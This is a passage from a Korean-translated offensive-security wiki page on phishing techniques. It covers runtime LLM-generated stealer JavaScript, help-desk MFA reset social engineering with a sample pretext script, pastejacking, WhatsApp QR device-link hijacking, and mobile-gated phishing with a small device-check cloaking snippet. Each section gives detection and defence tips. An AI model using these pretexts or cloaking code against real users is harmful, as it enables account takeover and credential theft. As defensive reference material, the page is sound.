- Traffic가 잘 알려진 LLM domains 또는 평판이 좋은 CDN proxies로 향한다; 때로는 backend로 가는 WebSockets를 통해 이루어진다.
- static payload가 없고; malicious JS는 render 이후에만 존재한다.
- non-deterministic generations는 세션마다 **unique** stealers를 생성한다.

**Detection ideas**
- JS가 enabled된 sandboxes를 실행하고; **runtime `eval`/LLM responses에서 유래한 dynamic script creation**을 flag한다.
- LLM APIs로의 front-end POSTs 직후 반환된 text에 대해 `eval`/`Function`이 이어지는지 hunt한다.
- client traffic에서 승인되지 않은 LLM domains와 그 뒤따르는 credential POSTs를 alert한다.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
classic push-bombing 외에도, operators는 help-desk call 중에 단순히 **new MFA registration을 강제로 수행**하여 사용자의 기존 token을 무효화한다.  그 이후의 login prompt는 피해자에게는 legitimate하게 보인다.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
AzureAD/AWS/Okta 이벤트에서 **`deleteMFA` + `addMFA`**가 **같은 IP에서 몇 분 안에** 발생하는지 모니터링하세요.



## Clipboard Hijacking / Pastejacking

공격자는 손상된 웹페이지나 typosquatted 웹페이지에서 악성 명령을 피해자의 clipboard에 몰래 복사한 뒤, 사용자가 이를 **Win + R**, **Win + X** 또는 terminal window 안에 붙여넣도록 유도해, 다운로드나 attachment 없이 임의의 code를 실행하게 할 수 있습니다.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* lure page(예: 가짜 ministry/CERT “channel”)가 WhatsApp Web/Desktop QR를 보여주고 피해자에게 스캔하라고 안내하여, 공격자를 조용히 **linked device**로 추가합니다.
* 공격자는 세션이 제거될 때까지 즉시 chat/contact visibility를 얻습니다. 피해자는 나중에 “new device linked” notification을 볼 수 있으며, defenders는 신뢰할 수 없는 QR page 방문 직후의 예상치 못한 device-link 이벤트를 hunt할 수 있습니다.

### Mobile‑gated phishing to evade crawlers/sandboxes
공격자들은 크롤러가 최종 페이지에 도달하지 못하도록 간단한 device check 뒤에 phishing flow를 두는 경우가 점점 더 많습니다. 일반적인 패턴은 touch-capable DOM인지 테스트하고 결과를 server endpoint로 전송하는 작은 script이며; non‑mobile client에는 HTTP 500(또는 blank page)을 반환하고, mobile user에게는 전체 flow를 제공합니다.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logic (simplified):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server behaviour often observed:
- 첫 로드 시 세션 쿠키를 설정합니다.
- `POST /detect {"is_mobile":true|false}`를 허용합니다.
- 이후의 GET 요청에서 `is_mobile=false`이면 500(또는 placeholder)을 반환합니다. `true`일 때만 phishing을 제공합니다.

Hunting and detection heuristics:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: `GET /static/detect_device.js` → `POST /detect` → 비-mobile에 대해 HTTP 500; 정상 모바일 피해자 경로는 200과 후속 HTML/JS를 반환합니다.
- `ontouchstart` 또는 유사한 device checks에만 의존해 콘텐츠를 조건부로 제공하는 페이지를 차단하거나 면밀히 조사합니다.

Defence tips:
- mobile-like fingerprints와 JS enabled로 crawler를 실행해 gated content를 드러냅니다.
- 새로 등록된 도메인에서 `POST /detect` 뒤에 발생하는 의심스러운 500 응답을 경고합니다.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)

{{#include ../../banners/hacktricks-training.md}}
